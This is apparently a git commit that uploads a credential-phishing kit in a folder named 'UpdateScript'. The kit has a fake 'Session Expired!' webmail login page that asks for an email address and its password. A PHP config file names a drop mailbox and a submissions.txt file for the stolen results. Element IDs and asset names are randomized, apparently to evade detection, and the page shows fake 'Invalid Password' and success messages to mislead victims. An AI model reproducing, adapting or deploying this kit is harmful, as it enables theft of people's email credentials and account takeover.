3305bc69c73492dac22074885ca764a5a4738880
love090hub <bandjfarms@abbnebraska.com>
2026-06-02 20:08:54 -0700

    Add files via upload

---
+++ UpdateScript/assets/php/result.php
@@ -0,0 +1,6 @@
+<?php
+// This file only holds the "to" email address
+$resultbox = "billiondee@yandex.com"; // Replace with your email
+$filename = "submissions.txt"; // replace with your result txt filename. Do not remove or leave empty
+
+?>
---
+++ UpdateScript/index.php
@@ -0,0 +1,55 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+
+<body class="bg-slate-600 bg-blend-overlay bg-no-repeat bg-cover bg-top flex items-center justify-center h-screen w-screen">
+
+    <div id="loading"><img src="assets/img/vuhf13lr8j.gif" alt=""></div>
+
+    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md mx-4">
+        <div class="flex justify-center items-center">
+            <img id="logo" src="assets/img/eahmnhyh2a.png" alt="" class="h-20 w-20 mb-4" onerror="this.onerror = null; this.src = 'assets/img/eahmnhyh2a.png'">
+        </div>
+        <h2 class="text-center text-2xl font-bold text-red-500 mb-4" id="dcn4t04x4i5byvi">
+            <span class="text-2xl font-bold" id="ap0p7s8vtg"></span>&nbsp;<span id="vdg2f1pyht">Session Expired!</span>
+        </h2>
+
+        <div class="mb-4">
+            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2 text-center" id="jo9m5a8qe314bvq" style="display: none">
+                <strong class="font-bold">Invalid Password.</strong>
+            </div>
+            <div class="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded text-center" id="rop0jkp5oddjh4f" style="display: none">
+                <strong class="font-bold">Session Authenticated Successfully!</strong>
+            </div>
+        </div>
+
+        <div class="flex items-center border rounded-lg mb-4 px-3 py-2">
+            <img src="assets/img/twed7t1lkd.png" alt="" class="h-4 w-4 mr-2">
+            <input id="fzrf476uwg04ifj" class="w-full outline-none" required="" placeholder="Email Address" type="email">
+        </div>
+
+        <div class="flex items-center border rounded-lg mb-4 px-3 py-2">
+            <img src="assets/img/j71m92wdot.png" alt="" class="h-4 w-4 mr-2">
+            <input id="mb9762t83cqwoxb" class="w-full outline-none" required="" placeholder="Enter Your Email Password" type="password">
+        </div>
+
+        <div class="flex items-center mb-4">
+            <input type="checkbox" class="form-checkbox h-4 w-4 text-blue-600" checked="">
+            <label class="ml-2 text-sm text-gray-600" id="fnwayfk8t6n6veg">Remember Me</label>
+        </div>
+
+        <button id="akjza30h39qkt1u" class="w-full bg-blue-500 text-white font-bold py-2 rounded-lg hover:bg-blue-600">Login</button>
+    </div>
+    <script src="assets/js/qymt22xfza.js"></script>
+    <script src="assets/js/gahsf54d2k.js"></script>
+    <script src="assets/js/unw3ir66zc.js"></script>
+
+
+</body>
+
+</html>
